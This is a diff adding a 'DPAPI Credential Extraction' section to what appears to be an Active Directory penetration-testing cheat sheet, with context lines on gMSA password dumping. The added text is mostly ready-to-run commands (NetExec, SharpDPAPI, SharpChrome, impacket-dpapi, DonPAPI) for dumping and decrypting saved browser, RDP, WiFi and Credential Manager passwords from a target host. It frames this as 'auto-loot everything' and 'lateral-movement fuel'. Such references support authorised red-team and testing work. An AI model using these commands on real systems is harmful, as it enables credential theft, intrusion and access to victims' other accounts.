@@ -272,6 +272,70 @@ gMSADumper.py -u user -p pass -d domain.local
 nxc ldap dc01 -u user -p pass --gmsa
 ```
 
+### DPAPI Credential Extraction
+
+With local admin on a machine you can decrypt **DPAPI**-protected secrets — browser saved passwords, RDP credentials, WiFi passwords, Credential Manager entries, scheduled task creds. Even when SAM / LSA dumps come up dry, DPAPI often hands you plaintext passwords for *other* systems the user logged into from this host.
+
+**How DPAPI stores secrets:**
+
+```
+User blobs       → %APPDATA%\Microsoft\Credentials\
+                   %APPDATA%\Microsoft\Protect\<SID>\ (masterkeys)
+Machine blobs    → C:\ProgramData\Microsoft\Credentials\
+                   C:\Windows\System32\Microsoft\Protect\S-1-5-18\ (machine masterkeys)
+
+Decryption key:  User password (or NT hash) → decrypts user masterkey → decrypts blob
+                 DPAPI_SYSTEM LSA secret    → decrypts machine masterkey → decrypts blob
+```
+
+**NetExec — fastest from Kali:**
+
+```bash
+# Dump + decrypt DPAPI blobs (Credential Manager, Chrome, browsers, etc.)
+nxc smb TARGET -u admin -p pass --local-auth --dpapi
+
+# Explicit module form (more verbose output)
+nxc smb TARGET -u admin -p pass --local-auth -M dpapi
+```
+
+**Windows — SharpDPAPI (post-exploitation):**
+
+```powershell
+# Triage everything under the current user
+SharpDPAPI.exe triage
+
+# Triage machine-scoped blobs (requires local SYSTEM)
+SharpDPAPI.exe machinetriage
+
+# Decrypt a Credential Manager blob using an exported masterkey file
+SharpDPAPI.exe credentials /mkfile:masterkeys.txt
+
+# Chrome / Edge / Brave saved logins
+SharpChrome.exe logins /mkfile:masterkeys.txt
+```
+
+**Linux — Impacket:**
+
+```bash
+# Decrypt a specific credential file when you already have the masterkey
+impacket-dpapi credentials -file CREDENTIAL_FILE -key DPAPI_KEY
+
+# Extract masterkey from a pvk / user context
+impacket-dpapi masterkey -file /path/to/masterkey -sid USER_SID -password 'UserPassword'
+```
+
+**DonPAPI — auto-loot everything:**
+
+```bash
+# Sweeps Credential Manager, browsers, Vaults, RDP, WiFi across the target
+DonPAPI domain/user:pass@TARGET
+
+# Multiple targets + output directory
+DonPAPI -t targets.txt -o loot/ domain/user:pass
+```
+
+> 💡 **Why DPAPI matters:** SAM gives you local accounts on *this* box; LSA gives you creds used by services on *this* box. DPAPI gives you every password *the user typed into something else* — their Outlook, their bank, the VPN to another environment. It's lateral-movement fuel.
+
 ### NTDS.dit Offline Extraction
 
 If you have physical or Backup Operator access:
